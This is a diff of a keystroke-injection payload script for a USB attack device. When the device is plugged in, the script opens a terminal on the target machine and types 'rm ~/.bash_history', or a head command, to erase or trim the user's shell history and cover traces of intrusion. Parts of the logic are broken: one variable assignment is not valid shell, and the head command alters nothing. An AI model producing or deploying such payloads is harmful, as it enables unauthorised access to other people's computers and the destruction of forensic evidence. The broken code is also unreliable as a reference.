@@ -13,7 +13,7 @@
 LINES = 0
 
 LED R
-ATTACKMODE HID
+ATTACKMODE HID STORAGE
 
 PLATFORM_COMMAND = ""
 if [ ! -f ~/.bash_history ]; then
@@ -24,25 +24,25 @@ else
     $PLATFORM_COMMAND = "terminal"
 fi
 
-DELAY 1000
-ALT F2
-DELAY 50
-GUI SPACE
-DELAY 50
-GUI r
-BACKSPACE
-DELAY 100
-STRING $PLATFORM_COMMAND
-ENTER
-DELAY 1000
+QUACK DELAY 1000
+QUACK ALT F2
+QUACK DELAY 50
+QUACK GUI SPACE
+QUACK DELAY 50
+QUACK GUI r
+QUACK BACKSPACE
+QUACK DELAY 100
+QUACK STRING $PLATFORM_COMMAND
+QUACK ENTER
+QUACK DELAY 1000
 
 if $PLATFORM_COMMAND == "terminal" then
     if $LINES > 0 then
-        STRING head -n -$LINES ~/.bash_history
-        ENTER
+        QUACK STRING head -n -$LINES ~/.bash_history
+        QUACK ENTER
     else
-        STRING rm ~/.bash_history
-        ENTER
+        QUACK STRING rm ~/.bash_history
+        QUACK ENTER
     fi
 fi
 
